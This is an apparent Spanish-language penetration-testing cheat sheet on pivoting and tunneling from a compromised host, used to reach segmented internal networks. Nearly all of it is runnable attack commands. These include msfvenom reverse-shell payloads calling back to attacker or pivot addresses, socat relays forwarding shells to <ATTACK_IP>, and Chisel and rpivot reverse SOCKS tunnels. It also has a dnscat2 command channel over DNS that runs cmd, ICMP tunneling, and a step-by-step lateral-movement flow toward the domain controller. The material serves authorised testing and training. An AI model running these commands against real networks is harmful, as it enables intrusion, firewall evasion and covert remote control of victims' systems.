---
title: "Pivoting & Tunneling"
description: "Chisel, ligolo, SSH tunnels y proxychains para movimiento lateral."
sidebar:
  order: 1
  label: "Pivoting & Tunneling"
---
> Técnicas para moverse entre redes segmentadas usando un host comprometido como punto de pivote. SSH tunnels, Chisel, Sshuttle, Meterpreter routing, Netsh y más.

---


## Reconocimiento previo al pivot

```bash
# En el pivot host comprometido — identificar redes accesibles
ifconfig                           # Linux — buscar múltiples NICs
ip addr                            # alternativa Linux
ipconfig                           # Windows

# Ver tabla de rutas
netstat -r                         # Linux
ip route                           # Linux
route print                        # Windows

# Ping sweep para descubrir hosts en la red interna
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Windows PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

---

## SSH — Tunneling y Port Forwarding

### Local Port Forwarding (`-L`)

```bash
# Exponer servicio remoto en localhost del attack host
# Caso: MySQL en el pivot host no accesible desde afuera
ssh -L 1234:localhost:3306 ubuntu@<PIVOT_IP>
# → ahora: mysql -u root -h 127.0.0.1 -P 1234

# Múltiples puertos simultáneos
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<PIVOT_IP>

# Exponer servicio en host INTERNO (no el pivot mismo)
ssh -L 8443:172.16.5.25:443 ubuntu@<PIVOT_IP>
```

### Dynamic Port Forwarding (`-D`) — SOCKS Proxy

```bash
# Crear SOCKS proxy en el attack host via SSH al pivot
ssh -D 9050 ubuntu@<PIVOT_IP>

# Configurar proxychains
tail -4 /etc/proxychains.conf
# → agregar/verificar: socks4 127.0.0.1 9050

# Usar herramientas a través del proxy
proxychains nmap -v -Pn -sT 172.16.5.19           # scan TCP completo
proxychains nmap -v -sn 172.16.5.1-200            # host discovery
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
proxychains msfconsole                            # Metasploit completo
```

> **Regla proxychains:** Solo funciona con TCP completo (`-sT`). No funciona con SYN scans ni ICMP. ICMP pings a Windows pueden fallar por Defender.

### Remote Port Forwarding (`-R`)

```bash
# Caso: tenemos RDP al pivot (Windows), queremos recibir reverse shell del target interno
# El target interno conecta a pivot:8080 → attack host:8000

# En attack host: arrancar handler en 8000
msf6 exploit(multi/handler) > set LPORT 8000

# En attack host: crear el túnel SSH reverso
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<PIVOT_IP> -vN

# Generar payload apuntando al pivot
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 LPORT=8080 -f exe -o payload.exe
```

---

## Sshuttle — Proxy transparente (sin proxychains)

```bash
# Instalar
sudo apt-get install sshuttle

# Redirigir TODO el tráfico a la red interna via SSH
sudo sshuttle -r ubuntu@<PIVOT_IP> 172.16.5.0/23 -v

# Después: herramientas funcionan directamente (sin proxychains)
nmap -v -A -sT -p3389 172.16.5.19 -Pn
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

> **Ventaja vs proxychains:** No hay que prefixar cada comando. Transparente a nivel iptables.

---

## Meterpreter Tunneling

### Autoroute + SOCKS Proxy

```bash
# 1. Obtener sesión Meterpreter en el pivot host
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATACK_IP> LPORT=8080 -f elf -o pivot.elf

# 2. Añadir rutas hacia la red interna
meterpreter > run post/multi/manage/autoroute SUBNET=172.16.5.0 SESSION=1
# alternativa:
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p                 # listar rutas activas

# 3. Levantar SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run

# 4. Proxychains → ya puede alcanzar la red interna
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

# Ping sweep desde Meterpreter (sin proxychains)
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### portfwd — Forward de puerto específico

```bash
# Forward: local:3300 → interno:3389
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# → xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# Reverse port forward: interno:1234 → attack host:8081
meterpreter > portfwd add -R -l 8081 -p 1234 -L <ATTACK_IP>

# Listar reglas activas
meterpreter > portfwd list
```

---

## Chisel — TCP/UDP sobre HTTP (Linux/Windows)

### Modo estándar — servidor en el pivot host

```bash
# En el pivot host: levantar servidor
./chisel server -v -p 1234 --socks5

# En el attack host: conectar como cliente
./chisel client -v <PIVOT_IP>:1234 socks
# → SOCKS5 listener en localhost:1080

# Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Modo reverso — servidor en el attack host

```bash
# Útil cuando el pivot host no puede recibir conexiones entrantes

# En el attack host: servidor con --reverse
sudo ./chisel server --reverse -v -p 1234 --socks5

# En el pivot host: cliente conecta al attack host
./chisel client -v <ATTACK_IP>:1234 R:socks
# → SOCKS5 en attack host:1080
```

> **Tip:** Si hay error de glibc en el target, usar versión precompilada del mismo SO desde GitHub Releases.

---

## Socat — Relay bidireccional

```bash
# Redirigir conexiones entrantes → host interno (reverse shell)
# pivot escucha en 8080, reenvía al attack host:80
socat TCP4-LISTEN:8080,fork TCP4:<ATTACK_IP>:80

# Bind shell redirect: pivot:8080 → Windows:8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Con Metasploit:
# Payload apunta a pivot:8080, handler en attack host:80
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe
msf6 > use multi/handler → set LPORT 80
```

---

## Windows — Herramientas nativas

### Netsh — Port forwarding nativo

```powershell
# Crear regla: Windows pivot escucha en 8080, redirige a interno:3389
netsh.exe interface portproxy add v4tov4 `
  listenport=8080 listenaddress=<PIVOT_IP> `
  connectport=3389 connectaddress=172.16.5.25

# Verificar reglas activas
netsh.exe interface portproxy show v4tov4

# Eliminar regla
netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=<PIVOT_IP>

# Conectar desde attack host
xfreerdp /v:<PIVOT_IP>:8080 /u:victor /p:pass@123
```

### Plink.exe — SSH dinámico desde Windows

```powershell
# Crear SOCKS proxy en Windows attack host
plink -ssh -D 9050 ubuntu@<PIVOT_IP>

# Luego: configurar Proxifier en Windows para usar 127.0.0.1:1080
# mstsc.exe → conectar a RDP interno
```

### SocksOverRDP — SOCKS sobre sesión RDP

```powershell
# 1. En el host Windows pivot: cargar plugin DLL
regsvr32.exe SocksOverRDP-Plugin.dll

# 2. Conectar a host interno via mstsc.exe
# → El plugin intercepta y crea SOCKS listener en 127.0.0.1:1080

# 3. En el host interno: iniciar servidor
SocksOverRDP-Server.exe

# 4. Verificar listener
netstat -antb | findstr 1080

# 5. Configurar Proxifier en el pivot → forward a 127.0.0.1:1080
```

---

## Tunneling DNS/ICMP — Bypass de firewall

### Dnscat2 — C2 sobre DNS TXT

```bash
# Attack host: servidor dnscat2
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/ && sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host=<ATTACK_IP>,port=53,domain=inlanefreight.local --no-cache
# → proporciona --secret para el cliente

# Windows target: PowerShell client
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACK_IP> -Domain inlanefreight.local \
  -PreSharedSecret <SECRET> -Exec cmd

# Interactuar con sesión establecida
dnscat2> window -i 1     # abrir sesión
dnscat2> windows          # listar sesiones
```

### Ptunnel-ng — SSH sobre ICMP

```bash
# Pivot host: levantar servidor (requiere root)
sudo ./ptunnel-ng -r<PIVOT_IP> -R22

# Attack host: cliente conecta via ICMP
sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22

# SSH a través del túnel ICMP
ssh -p2222 -lubuntu 127.0.0.1

# Añadir SOCKS proxy sobre el túnel ICMP
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

## Rpivot — Reverse SOCKS proxy (Python 2.7)

```bash
# Attack host: servidor rpivot
git clone https://github.com/klsecservices/rpivot.git
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Pivot host: cliente conecta al attack host
scp -r rpivot ubuntu@<PIVOT_IP>:/home/ubuntu/
python2.7 client.py --server-ip <ATTACK_IP> --server-port 9999

# Con NTLM proxy corporativo
python client.py --server-ip <TARGET_IP> --server-port 8080 \
  --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 \
  --domain <DOMAIN> --username <user> --password <pass>

# En attack host: proxychains → 127.0.0.1:9050
proxychains firefox-esr 172.16.5.135:80
```

---

## Quick Reference — Comparativa de técnicas

| Técnica | OS Pivot | Requiere | Puerto SOCKS | Ventaja |
|---------|----------|----------|-------------|---------|
| SSH -D | Linux | SSH | 9050 | Nativo, sin herramientas |
| SSH -R | Linux | SSH | — | Reverse shell desde red interna |
| Sshuttle | Linux | SSH + Python | — | Transparente, sin proxychains |
| Chisel (std) | Linux/Win | Chisel binary | 1080 | HTTP, elude firewalls |
| Chisel (rev) | Linux/Win | Chisel binary | 1080 | Pivot no recibe conexiones |
| Meterpreter | Linux/Win | Metasploit | 9050 | Integrado, post-exploit |
| Netsh | Windows | Admin | — | LOL binary nativo |
| Plink.exe | Windows | PuTTY | 9050 | Sin tools adicionales |
| Dnscat2 | Linux/Win | DNS saliente | — | Elude firewall HTTP/HTTPS |
| Ptunnel-ng | Linux | ICMP saliente | — | Elude firewall sin DNS |

---

## Flujo de pivot — Paso a paso

```
1. Comprometer pivot host (webshell, RCE, SSH creds)
2. ifconfig / ip addr → identificar NICs y redes internas
3. Ping sweep / nmap via proxychains → descubrir hosts internos
4. Elegir técnica según acceso disponible (ver tabla arriba)
5. Escanear hosts internos: proxychains nmap -Pn -sT <host>
6. Comprometer host interno → nuevo punto de pivot
7. Repetir → profundizar hacia DC / target final
```

---

## Pitfalls / Gotchas

- **proxychains solo TCP completo** → usar `-sT` con nmap, no `-sS` (SYN). Resultados de ICMP no fiables.
- **Chisel glibc mismatch** → compilar en el mismo SO del target, o usar prebuilt de GitHub Releases.
- **SSH -D es bloqueado por firewall** → cambiar al puerto 443 (`ssh -D 9050 -p443 ubuntu@<IP>`).
- **Meterpreter autoroute** → no funciona si la sesión es shell básica; necesita sesión Meterpreter real.
- **Sshuttle no es compatible con Windows attack host** — solo funciona en Linux/macOS.
- **Dnscat2** → el tráfico DNS puede ser detectado si el SOC monitorea queries TXT anómalos.
- **Ptunnel-ng** → requiere privilegios root en el pivot host (raw socket para ICMP).
- **Netsh portproxy** → requiere admin en Windows; no persiste si se reinicia el servicio sin `sc.exe`.
- **proxychains + xfreerdp** → puede ser lento; reducir colores y deshabilitar efectos en mstsc.
- **SocksOverRDP** → necesita cargarse DLL con `regsvr32` Y servidor corriendo en el host destino. Doble hop.
- **SSH -R sintaxis** → `ssh -R <pivot_listen_ip>:<pivot_port>:0.0.0.0:<local_port>` — el orden importa.

---

## Herramientas Relacionadas (Ecosistema pwnVader)

<aside class="my-6 p-4 rounded-md border-l-4 border-[#0ea5e9] bg-[#0ea5e9]/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-[#0ea5e9] font-bold mb-1">
    Herramienta · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    ¿Quieres estructurar y generar comandos de redireccionamiento rápidamente? Diseña tus comandos de Chisel, SSH Port Forwarding o Ligolo de manera interactiva utilizando el <a href="https://hacking.pwnvader.com/networking/tunneling" class="text-[#0ea5e9] hover:underline">Tunneling & Pivoting Designer</a> en nuestra suite serverless.
  </p>
</aside>

---

## Cheatsheets relacionados

- [Shells & Payloads](/metodologias/exploitation/shells-payloads/) — generar payloads que apunten al pivot en vez del attack host
- [Using the Metasploit Framework](/metodologias/exploitation/metasploit-framework/) — autoroute, portfwd, socks_proxy en profundidad
- [File Transfers](/metodologias/privesc/file-transfers/) — transferir herramientas (chisel, plink) al pivot host
- [Active Directory Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — pivoting hacia DC desde foothold
- [Attacking Enterprise Networks](/metodologias/active-directory/attacking-enterprise-networks/) — flujo end-to-end con múltiples pivots

